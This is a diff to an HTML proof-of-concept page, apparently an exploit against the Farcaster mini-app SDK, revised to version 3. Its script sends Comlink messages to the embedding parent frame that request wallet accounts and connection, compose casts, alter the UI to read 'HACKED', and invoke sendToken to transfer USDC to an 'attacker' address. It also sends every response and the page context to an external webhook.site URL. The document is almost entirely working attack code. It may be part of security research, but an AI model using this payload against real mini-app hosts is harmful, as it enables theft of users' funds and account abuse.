@@ -68,11 +68,11 @@
 		</style>
 	</head>
 	<body>
-		<div class="banner">⚠️ Farcaster SDK Exploit — Step by Step</div>
+		<div class="banner">⚠️ Farcaster SDK Exploit — Step by Step (v3)</div>
 
 		<div class="card">
 			<h3>🎬 Action Log</h3>
-			<div id="action-log">Starting in 2 seconds...</div>
+			<div id="action-log">Starting...</div>
 		</div>
 
 		<div class="card">
@@ -87,9 +87,8 @@
 
 		<script>
 			var WEBHOOK = "https://webhook.site/a9641ead-2421-404a-83bd-6be9ad1c4e60";
-			var msgCounter = 4000;
+			var msgCounter = 5000;
 			var allResponses = [];
-			var actionLog = document.getElementById("action-log");
 
 			function sendToWebhook(label, data) {
 				try {
@@ -103,40 +102,46 @@
 			}
 
 			window.addEventListener("message", function (event) {
-				if (event.data?.type === "HANDLER" || event.data?.type === "RAW") {
+				if (event.data && (event.data.type === "HANDLER" || event.data.type === "RAW")) {
 					var resp = {
-						id: event.data?.id,
-						type: event.data?.type,
-						value: event.data?.value,
-						name: event.data?.name,
+						id: event.data.id,
+						type: event.data.type,
+						value: event.data.value,
+						name: event.data.name,
 					};
 					allResponses.push(resp);
 					document.getElementById("last-response").textContent = JSON.stringify(resp, null, 2);
 					document.getElementById("all-responses").textContent = JSON.stringify(allResponses, null, 2);
-					sendToWebhook("RESPONSE", event.data);
+					sendToWebhook("RESP_" + event.data.id, event.data);
 
-					var actionEl = document.getElementById("action-" + event.data?.id);
-					if (actionEl) {
-						if (event.data?.type === "RAW" && !event.data?.value?.isError) {
-							actionEl.className = "action-item done";
-							actionEl.innerHTML = actionEl.innerHTML.replace("⏳", "✅ SUCCESS");
-						} else if (event.data?.name === "throw") {
-							var errMsg = event.data?.value?.value?.message || "unknown";
-							actionEl.className = "action-item error";
-							actionEl.innerHTML = actionEl.innerHTML.replace("⏳", "⚡ EXECUTED: " + errMsg.substring(0, 50));
+					var el = document.getElementById("action-" + event.data.id);
+					if (el) {
+						if (event.data.type === "RAW" && !(event.data.value && event.data.value.isError)) {
+							el.className = "action-item done";
+							el.textContent = "✅ " + el.getAttribute("data-name") + " — SUCCESS! " + JSON.stringify(event.data.value || "(void)").substring(0, 80);
+						} else {
+							var msg = event.data.value?.value?.message || event.data.value?.message || "executed";
+							el.className = "action-item error";
+							el.textContent = "⚡ " + el.getAttribute("data-name") + " — EXECUTED: " + msg.substring(0, 80);
 						}
 					}
 				}
 			});
 
-			function call(method, args) {
+			// Comlink uses fromWireValue to deserialize argumentList items
+			// RAW type = direct value passthrough
+			function wireRaw(val) {
+				return [{ type: "RAW", value: val }];
+			}
+
+			function call(method, wireArgs) {
 				var id = msgCounter++;
 				window.parent.postMessage(
 					{
 						id: id,
 						type: "APPLY",
 						path: [method],
-						argumentList: args || [],
+						argumentList: wireArgs,
 					},
 					"*",
 				);
@@ -144,118 +149,109 @@
 				return id;
 			}
 
-			var sequence = [
-				{
-					delay: 2000,
-					name: "ready()",
-					fn: function () {
-						return call("ready", [{}]);
-					},
-					desc: "Signal ready",
-				},
-				{
-					delay: 5000,
-					name: "openUrl()",
-					fn: function () {
-						return call("openUrl", ["https://example.com"]);
-					},
-					desc: "Open URL in new tab",
-				},
-				{
-					delay: 9000,
-					name: "setPrimaryButton()",
-					fn: function () {
-						return call("setPrimaryButton", ["HACKED", true]);
-					},
-					desc: "Change button text",
-				},
-				{
-					delay: 13000,
-					name: "viewProfile(fid:3)",
-					fn: function () {
-						return call("viewProfile", [3]);
-					},
-					desc: "Navigate to dwr profile",
-				},
-				{
-					delay: 17000,
-					name: "composeCast()",
-					fn: function () {
-						return call("composeCast", ["Security PoC - attacker controlled"]);
-					},
-					desc: "Open composer with attacker text",
-				},
-				{
-					delay: 21000,
-					name: "eth_accounts",
-					fn: function () {
-						return call("ethProviderRequestV2", [{ method: "eth_accounts", params: [] }]);
-					},
-					desc: "Get wallet address",
-				},
-				{
-					delay: 25000,
-					name: "eth_chainId",
-					fn: function () {
-						return call("ethProviderRequestV2", [{ method: "eth_chainId", params: [] }]);
-					},
-					desc: "Get chain ID",
-				},
-				{
-					delay: 29000,
-					name: "signIn()",
-					fn: function () {
-						return call("signIn", ["nonce_" + Date.now()]);
-					},
-					desc: "Trigger sign-in",
-				},
-				{
-					delay: 33000,
-					name: "addMiniApp()",
-					fn: function () {
-						return call("addMiniApp", []);
-					},
-					desc: "Add to favorites",
-				},
-				{
-					delay: 37000,
-					name: "sendToken()",
-					fn: function () {
-						return call("sendToken", ["eip155:8453/erc20:0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", "1", "0x0000000000000000000000000000000000000001"]);
-					},
-					desc: "Send token to attacker",
-				},
-				{
-					delay: 41000,
-					name: "close()",
-					fn: function () {
-						return call("close", []);
-					},
-					desc: "Dismiss the mini app panel (LAST)",
-				},
-			];
-
-			actionLog.innerHTML = "";
-			sequence.forEach(function (action, i) {
+			function addAction(id, name, delay) {
 				var div = document.createElement("div");
 				div.className = "action-item pending";
-				div.id = "action-pending-" + i;
-				div.innerHTML = '<span class="pending">⏸ [' + action.delay / 1000 + "s] " + action.name + "</span> — " + action.desc;
-				actionLog.appendChild(div);
-			});
+				div.id = "action-" + id;
+				div.setAttribute("data-name", name);
+				div.textContent = "⏸ [" + delay + "s] " + name;
+				document.getElementById("action-log").appendChild(div);
+			}
 
-			sequence.forEach(function (action, i) {
-				setTimeout(function () {
-					var el = document.getElementById("action-pending-" + i);
-					el.className = "action-item running";
-					el.innerHTML = '<span class="running">⏳ ' + action.name + "</span> — " + action.desc;
-					var id = action.fn();
-					el.id = "action-" + id;
-					el.scrollIntoView({ behavior: "smooth", block: "nearest" });
-				}, action.delay);
-			});
+			document.getElementById("action-log").innerHTML = "";
 
-			sendToWebhook("poc_v3_started", {
+			// =============================================
+			// Sequence with CORRECT argument formats
+			// Comlink argumentList items go through fromWireValue
+			// We try both raw args and wire-formatted args
+			// =============================================
+
+			var delay = 2;
+
+			// 1. ready — no args needed
+			setTimeout(function () {
+				var id = call("ready", wireRaw({}));
+				addAction(id, "ready()", delay);
+			}, delay * 1000);
+			delay += 4;
+
+			// 2. ethProviderRequestV2 — needs jsonrpc format
+			setTimeout(function () {
+				var id = call("ethProviderRequestV2", wireRaw({ jsonrpc: "2.0", id: 1, method: "eth_accounts", params: [] }));
+				addAction(id, "eth_accounts (jsonrpc format)", delay);
+			}, delay * 1000);
+			delay += 4;
+
+			// 3. ethProviderRequestV2 — eth_chainId
+			setTimeout(function () {
+				var id = call("ethProviderRequestV2", wireRaw({ jsonrpc: "2.0", id: 2, method: "eth_chainId", params: [] }));
+				addAction(id, "eth_chainId (jsonrpc format)", delay);
+			}, delay * 1000);
+			delay += 4;
+
+			// 4. openUrl — try direct string in wire format
+			setTimeout(function () {
+				var id = call("openUrl", wireRaw("https://example.com"));
+				addAction(id, 'openUrl("https://example.com")', delay);
+			}, delay * 1000);
+			delay += 4;
+
+			// 5. setPrimaryButton — object with text property
+			setTimeout(function () {
+				var id = call("setPrimaryButton", wireRaw({ text: "HACKED", enabled: true }));
+				addAction(id, 'setPrimaryButton({text:"HACKED"})', delay);
+			}, delay * 1000);
+			delay += 4;
+
+			// 6. viewProfile — try with fid
+			setTimeout(function () {
+				var id = call("viewProfile", wireRaw({ fid: 3 }));
+				addAction(id, "viewProfile({fid:3})", delay);
+			}, delay * 1000);
+			delay += 4;
+
+			// 7. composeCast — try with text and empty embeds
+			setTimeout(function () {
+				var id = call("composeCast", wireRaw({ text: "PoC: attacker controlled cast", embeds: [] }));
+				addAction(id, 'composeCast({text:"attacker text"})', delay);
+			}, delay * 1000);
+			delay += 4;
+
+			// 8. eth_requestAccounts — triggers wallet connect
+			setTimeout(function () {
+				var id = call("ethProviderRequestV2", wireRaw({ jsonrpc: "2.0", id: 3, method: "eth_requestAccounts", params: [] }));
+				addAction(id, "eth_requestAccounts", delay);
+			}, delay * 1000);
+			delay += 4;
+
+			// 9. addMiniApp
+			setTimeout(function () {
+				var id = call("addMiniApp", wireRaw({}));
+				addAction(id, "addMiniApp()", delay);
+			}, delay * 1000);
+			delay += 4;
+
+			// 10. sendToken
+			setTimeout(function () {
+				var id = call(
+					"sendToken",
+					wireRaw({
+						token: "eip155:8453/erc20:0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
+						amount: "0.01",
+						recipientAddress: "0x0000000000000000000000000000000000000001",
+					}),
+				);
+				addAction(id, "sendToken(USDC to attacker)", delay);
+			}, delay * 1000);
+			delay += 4;
+
+			// 11. close — LAST
+			setTimeout(function () {
+				var id = call("close", []);
+				addAction(id, "close() — dismiss panel", delay);
+			}, delay * 1000);
+
+			sendToWebhook("v3_fixed_started", {
 				location: window.location.href,
 				referrer: document.referrer,
 				isFramed: window.self !== window.top,
